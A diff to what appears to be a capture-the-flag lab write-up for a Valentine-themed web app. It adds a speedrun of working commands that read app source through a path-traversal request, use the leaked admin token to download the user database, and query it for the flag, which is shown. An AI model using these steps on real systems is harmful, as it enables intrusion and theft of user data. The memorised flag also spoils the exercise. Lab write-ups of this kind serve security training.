@@ -197,7 +197,6 @@ curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
 
 //9) Open the SQLite DB and locate the flag
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
 sqlite3 valenfind_leak.db
 
 
@@ -216,6 +215,17 @@ User cupid had the flag in the address field:
 
 //FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 
+***Optional SpeedRun***
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+curl "http://10.65.183.114:5000/api/fetch_layout?layout=../../app.py" | grep ADMIN_API_KEY
+
+curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
+  http://10.65.183.114:5000/api/admin/export_db -o leak.db
+
+sqlite3 leak.db "SELECT username,address FROM users WHERE username='cupid';"
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 2026-02-16 19:15:40 EST -- COMPLETE
 
